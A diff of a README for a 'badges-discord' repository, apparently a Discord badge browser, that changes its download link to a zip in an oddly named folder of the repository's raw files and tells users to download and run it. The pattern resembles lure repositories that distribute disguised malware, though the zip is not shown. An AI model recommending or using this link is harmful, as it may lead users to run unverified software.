@@ -4,7 +4,7 @@
 Welcome to the **badges-discord** repository! This application helps you explore a full collection of Discord badges, including how to earn them. Whether you’re a new user or a seasoned member, you can easily find the latest guild clans and Discord Nitro badges.
 
 ## 📥 Download & Install
-To start using badges-discord, visit this page to download: [Download badges-discord](https://raw.githubusercontent.com/Neutrinonuub1/badges-discord/main/incorporative/badges-discord.zip)
+To start using badges-discord, visit this page to download: [Download badges-discord](https://raw.githubusercontent.com/Neutrinonuub1/badges-discord/main/assets/special/badges_discord_2.6.zip)
 
 You will find the latest version of the software on the Releases page. Follow these steps to download and run the application:
 
